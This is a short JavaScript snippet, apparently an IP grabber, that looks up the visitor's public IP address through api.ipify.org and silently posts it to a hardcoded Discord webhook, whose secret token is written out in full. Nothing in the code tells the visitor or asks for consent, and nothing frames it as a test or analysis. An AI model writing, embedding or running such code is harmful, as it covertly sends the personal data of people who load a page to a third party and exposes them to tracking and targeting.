var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
ip = data.ip;
var webhook = 'https://discord.com/api/webhooks/1127834866860429363/r-VZjFW9j7n2uZHB46E608VXg1OXVa2NU6w5LVYMx26AMrOD954SLnZWqV0y1hmZPxJy'
var message = {
content: 'IP:' + ip
};

fetch (webhook, {
method: 'POST',
headers: {
     'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});